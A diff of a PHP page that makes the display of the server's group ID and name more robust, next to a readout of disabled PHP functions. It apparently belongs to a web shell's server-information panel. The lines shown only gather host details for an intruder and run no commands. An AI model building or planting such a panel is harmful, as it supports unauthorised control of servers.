@@ -885,17 +885,20 @@ a {
 ?></span>
 
         </p>
-        <p>
-            <strong style="color: #00aaff;">组:</strong>
-            <span style="color: #ffffff;"><?php 
-                if (function_exists('posix_getegid')) {
-                    $qid = posix_getgrgid(posix_getegid());
-                    echo getmygid() . " (" . $qid['name'] . ")";
-                } else {
-                    echo getmygid();
-                }
-            ?></span>
-        </p>
+		<p>
+		    <strong style="color: #00aaff;">组:</strong>
+		    <span style="color: #ffffff;"><?php 
+		        if (function_exists('getmygid') && function_exists('posix_getegid') && function_exists('posix_getgrgid')) {
+		            $qid = @posix_getgrgid(@posix_getegid());
+		            echo getmygid() . " (" . ($qid['name'] ?? '未知') . ")";
+		        } elseif (function_exists('getmygid')) {
+		            echo getmygid();
+		        } else {
+		            echo "Dinonaktifkan";
+		        }
+		    ?></span>
+		</p>
+
         <p>
             <strong style="color: #00aaff;">禁用函数:</strong>
             <span style="color: #ff6666;"><?php echo (implode(", ", $nami)=="" ? "NONE :)" : implode(", ", $nami)); ?></span>
